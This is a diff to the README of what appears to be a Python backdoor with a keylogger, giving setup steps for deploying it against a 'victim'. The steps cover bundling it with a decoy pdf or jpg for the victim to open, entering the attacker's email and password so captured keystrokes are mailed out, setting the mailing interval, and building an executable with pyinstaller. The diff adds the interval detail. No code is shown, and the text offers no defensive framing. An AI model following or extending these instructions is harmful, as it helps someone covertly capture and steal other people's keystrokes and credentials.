@@ -22,7 +22,8 @@ Find the links in the <a href="#references">references</a> section.
 Note that there are other data values but you do not need to change them
 4. Have a file that you want the victim to open ready - a pdf or a jpg etc. <u> Note the name and full path of the file</u> on the host computer where you will compile this backdoor
 5. Input this file name in the double quotes given in `data.py`
-6. If you want the keylogger to send you mails periodically, add your email and password in the `data.py`
+6. If you want the keylogger to send you mails periodically, add your `email` and `password` in the `data.py`. You can also change the `time` variable in seconds to denote in how much time the mail needs to be sent to you.
+Note: The initial mail will be sent to you when you switch on the Keylogger. All the subsequent mails will be in the interval `time` seconds. 
 
 ### <a id="converting" style="color: rgb(0,0,0)"><u>Converting into an Executable</u></a>:
 1. We will use the pyinstaller module for this. Make sure you have python3.7 installed on the host system you control
